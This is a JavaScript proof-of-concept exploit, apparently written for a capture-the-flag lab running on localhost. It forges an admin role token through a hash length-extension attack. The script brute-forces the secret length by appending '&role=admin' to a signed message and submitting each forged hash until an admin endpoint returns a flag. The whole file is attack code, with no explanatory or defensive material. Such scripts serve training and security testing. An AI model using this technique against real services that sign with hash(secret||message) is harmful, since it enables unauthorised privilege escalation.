const BASE = process.env.TARGET_BASE_URL ?? "http://localhost:3000";
const USERNAME = process.env.POC_USER ?? "arif";

async function main() {
  const issueRes = await fetch(`${BASE}/api/role/issue?user=${encodeURIComponent(USERNAME)}`);
  const issued = await issueRes.json();
  if (!issueRes.ok) {
    console.error("Role token issue failed:", issued);
    process.exit(1);
  }

  const appendText = "&role=admin";

  for (let guess = 1; guess <= 64; guess++) {
    const forgeRes = await fetch(`${BASE}/api/forge`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        originalMessageBase64: issued.messageBase64,
        originalHash: issued.hash,
        guessedSecretLength: guess,
        appendText
      })
    });
    const forged = await forgeRes.json();
    if (!forgeRes.ok) continue;

    const adminRes = await fetch(`${BASE}/api/role/admin-action`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        messageBase64: forged.forgedMessageBase64,
        hash: forged.forgedHash
      })
    });
    const result = await adminRes.json();
    if (result.flag) {
      console.log("SUCCESS: role escalation exploited");
      console.log("Secret length guess:", guess);
      console.log("Flag:", result.flag);
      return;
    }
  }

  console.log("Exploit failed. Try increasing secret-length search range.");
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
